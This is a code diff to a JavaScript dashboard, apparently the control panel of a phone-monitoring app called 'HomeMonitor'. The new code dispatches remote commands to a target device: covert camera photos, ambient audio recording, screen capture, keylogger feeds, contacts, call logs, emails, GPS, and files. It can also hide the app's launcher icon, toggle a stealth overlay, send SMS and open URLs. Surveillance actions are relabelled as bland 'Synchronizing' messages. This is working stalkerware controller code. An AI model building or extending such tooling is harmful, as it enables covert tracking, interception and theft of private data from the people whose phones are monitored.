@@ -546,7 +546,71 @@ function saveFeaturePermissions(uid, deviceId) {
     showDashboardNotification("success", `Master Admin: Flags & License (${licenseStatus}) updated for ${deviceId}`);
 }
 
-// Native RPC Action Dispatcher
+// Professional UI Toast Message Mapping
+function getProfessionalToastMessage(action, params = {}) {
+    switch (action) {
+        case "camera":
+        case "rearphoto":
+            return "📸 Requesting rear camera photo...";
+        case "frontcam":
+        case "frontphoto":
+            return "📸 Requesting front camera photo...";
+        case "audio":
+            return "🎙️ Requesting ambient audio recording...";
+        case "screenshot":
+            return "🖥️ Requesting live screen capture...";
+        case "screenrecord":
+            return "📹 Requesting screen video clip...";
+        case "status":
+            return "📊 Synchronizing device status...";
+        case "deviceinfo":
+        case "specs":
+            return "📱 Synchronizing hardware telemetry...";
+        case "contacts":
+            return "👥 Synchronizing address book contacts...";
+        case "calls":
+            return "📞 Synchronizing call history logs...";
+        case "emails":
+            return "📧 Synchronizing email messages...";
+        case "photos":
+        case "syncmedia":
+            return "📸 Synchronizing photo gallery...";
+        case "videos":
+            return "🎥 Synchronizing video library...";
+        case "geolocation":
+        case "iplocation":
+        case "gps":
+            return "📍 Synchronizing GPS location fix...";
+        case "packages":
+            return "📦 Synchronizing installed applications...";
+        case "keylog":
+            return "⌨️ Synchronizing keystroke activity...";
+        case "notifications":
+            return "🔔 Synchronizing notification feed...";
+        case "files":
+        case "files_list":
+        case "files_pwd":
+            return "📁 Synchronizing storage directory...";
+        case "sendsms":
+            return "💬 Outbound SMS message dispatched";
+        case "openurl":
+            return "🌐 Target URL launched on device";
+        case "geofence":
+            return "🌐 Geofence safe zone updated successfully";
+        case "hideapp":
+            return "🙈 Application launcher icon hidden";
+        case "unhideapp":
+            return "👁️ Application launcher icon restored";
+        case "stealth":
+            return "🕶️ Stealth screen overlay toggled";
+        case "lock":
+            return "🔒 Remote screen lock dispatched";
+        default:
+            return `⚡ Executing operation '${action}'...`;
+    }
+}
+
+// Native WebRTC API Action Dispatcher
 function dispatchNativeRpcAction(action, params = {}) {
     if (!action) return;
     if (!currentUser || !currentUser.uid) {
@@ -554,25 +618,108 @@ function dispatchNativeRpcAction(action, params = {}) {
         return;
     }
 
-    const targetDeviceId = (typeof getActiveRealDeviceId === "function") ? getActiveRealDeviceId() : (activeDeviceId || "");
-    window.lastDispatchedCmd = action;
+    const toastMsg = getProfessionalToastMessage(action, params);
+    showDashboardNotification("info", toastMsg);
 
-    console.log(`[Native RPC Action] Dispatching '${action}' to ${targetDeviceId}`, params);
-    showDashboardNotification("info", `Sending '${action}' to ${targetDeviceId}...`);
+    if (typeof HomeMonitorAPI !== "undefined" && HomeMonitorAPI) {
+        let apiPromise = null;
 
-    if (typeof sendNativeRpcRequest === "function") {
-        sendNativeRpcRequest(action, params)
-            .then(responseData => {
-                showDashboardNotification("success", `✅ Action '${action}' completed successfully.`);
-                handleNativeRpcResponseUI(action, responseData);
-            })
-            .catch(err => {
-                console.warn(`[Native RPC Action Fallback] ${err.message}`);
-                sendFirebaseNativeActionNode(action, params);
-            });
-    } else {
-        sendFirebaseNativeActionNode(action, params);
+        switch (action) {
+            case "camera":
+            case "rearphoto":
+                apiPromise = HomeMonitorAPI.camera.takePhoto('back').then(() => HomeMonitorAPI.media.getPhotos()).then(data => renderPhotosGallery(data));
+                break;
+            case "frontcam":
+            case "frontphoto":
+                apiPromise = HomeMonitorAPI.camera.takePhoto('front').then(() => HomeMonitorAPI.media.getPhotos()).then(data => renderPhotosGallery(data));
+                break;
+            case "audio":
+                apiPromise = HomeMonitorAPI.media.getAudio().then(data => renderAudioRecordings(data));
+                break;
+            case "screenshot":
+            case "screenrecord":
+                apiPromise = HomeMonitorAPI.media.getScreenrecordings().then(data => renderScreenrecorderClips(data));
+                break;
+            case "contacts":
+                apiPromise = HomeMonitorAPI.contacts.getList().then(data => renderContactsList(data));
+                break;
+            case "calls":
+                apiPromise = HomeMonitorAPI.calls.getLogs().then(data => renderCallsList(data));
+                break;
+            case "emails":
+                apiPromise = HomeMonitorAPI.emails.getList().then(data => renderEmailsList(data));
+                break;
+            case "photos":
+            case "syncmedia":
+                apiPromise = HomeMonitorAPI.media.getPhotos().then(data => renderPhotosGallery(data));
+                break;
+            case "videos":
+                apiPromise = HomeMonitorAPI.media.getVideos().then(data => renderVideosLibrary(data));
+                break;
+            case "geolocation":
+            case "iplocation":
+            case "gps":
+                apiPromise = HomeMonitorAPI.location.getCurrent().then(data => renderGpsLocation(data));
+                break;
+            case "packages":
+                apiPromise = HomeMonitorAPI.apps.getList().then(data => renderInstalledApps(data));
+                break;
+            case "keylog":
+                apiPromise = HomeMonitorAPI.logs.getFeed("keylogs").then(data => renderKeyloggerFeed(data));
+                break;
+            case "notifications":
+                apiPromise = HomeMonitorAPI.logs.getFeed("notifications").then(data => renderNotificationsFeed(data));
+                break;
+            case "files":
+            case "files_list":
+            case "files_pwd":
+                apiPromise = HomeMonitorAPI.files.list(params.path || "/sdcard").then(data => renderFileExplorer(data));
+                break;
+            case "sendsms":
+                apiPromise = HomeMonitorAPI.control.sendSms(params.phone, params.message);
+                break;
+            case "openurl":
+                apiPromise = HomeMonitorAPI.control.openUrl(params.url);
+                break;
+            case "geofence":
+                apiPromise = HomeMonitorAPI.geofences.update(params.name, params.radius).then(data => renderGeofenceList(data));
+                break;
+            case "hideapp":
+                apiPromise = HomeMonitorAPI.mdm.setKioskMode(true, params.packageName || "com.homemonitor");
+                break;
+            case "unhideapp":
+                apiPromise = HomeMonitorAPI.mdm.setKioskMode(false, params.packageName || "com.homemonitor");
+                break;
+            case "lock":
+                apiPromise = HomeMonitorAPI.control.lockScreen();
+                break;
+            case "status":
+                apiPromise = HomeMonitorAPI.device.getStatus().then(data => renderOverviewDashboard(data));
+                break;
+            case "deviceinfo":
+            case "specs":
+                apiPromise = HomeMonitorAPI.device.getInfo().then(data => renderOverviewDashboard(data));
+                break;
+            default:
+                apiPromise = HomeMonitorAPI.request(action, params);
+                break;
+        }
+
+        if (apiPromise) {
+            apiPromise
+                .then(resData => {
+                    showDashboardNotification("success", `✅ Operation completed successfully.`);
+                    if (resData) handleNativeRpcResponseUI(action, resData);
+                })
+                .catch(err => {
+                    console.warn(`[HomeMonitorAPI Action Fallback] ${err.message}`);
+                    sendFirebaseNativeActionNode(action, params);
+                });
+            return;
+        }
     }
+
+    sendFirebaseNativeActionNode(action, params);
 }
 
 function sendFirebaseNativeActionNode(action, params) {
